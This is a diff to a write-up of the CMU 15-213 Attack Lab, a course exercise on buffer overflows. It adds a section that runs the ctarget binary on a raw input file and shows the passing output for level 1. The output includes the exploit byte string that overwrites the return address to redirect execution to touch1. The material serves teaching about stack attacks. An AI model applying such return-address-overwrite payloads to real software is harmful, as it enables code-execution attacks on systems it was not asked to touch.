@@ -218,6 +218,21 @@ call getbuf() in test():
 +-----------------------------+ <-- 当前栈顶（%rsp 指向 buf 起始地址）
 ```
 
+##  Run progrom with inject assemble code(exploit code) 
+
+```shell
+./ctarget -q <raw1.txt
+Cookie: 0x59b997fa
+Type string:Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:1:01 02 03 04 05 06 07 08 01 02 03 04 05 06 07 08 01 02 03 04 05 06 07 08 01 02 03 04 05 06 07 08 01 02 03 04 05 06 07 08 C0 17 40 00 00 00 00 00 
+
+```
+
 ## GDB debugging
 
 unix > gdb ctarget
